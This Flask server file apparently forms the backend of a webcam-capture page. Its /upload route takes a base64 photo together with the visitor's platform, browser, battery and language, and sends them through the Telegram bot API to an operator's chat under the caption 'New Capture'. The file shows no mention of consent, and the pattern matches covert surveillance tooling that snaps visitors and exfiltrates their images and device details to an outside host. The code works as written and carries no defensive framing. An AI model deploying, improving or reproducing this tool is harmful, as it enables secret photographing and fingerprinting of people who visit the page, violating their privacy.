from flask import Flask, request, render_template
import os
import requests
import base64
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    data = request.get_json()
    image_data = data.get('photo')

    if not image_data:
        return 'No image data', 400

    # Convert base64 to file
    header, encoded = image_data.split(',', 1)
    image_bytes = base64.b64decode(encoded)

    # Send photo to Telegram
    files = {
        'photo': ('webcam.jpg', image_bytes)
    }
    caption = f"""
📷 New Capture:
🖥 Platform: {data.get('platform')}
🌐 Browser: {data.get('userAgent')}
🔋 Battery: {data.get('battery')}
🗣 Language: {data.get('language')}
    """

    response = requests.post(
        f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto",
        data={"chat_id": CHAT_ID, "caption": caption},
        files=files
    )

    if response.status_code != 200:
        print("Telegram error:", response.text)
        return 'Telegram send error', 500

    return 'Success', 200

if __name__ == '__main__':
    app.run(debug=True)
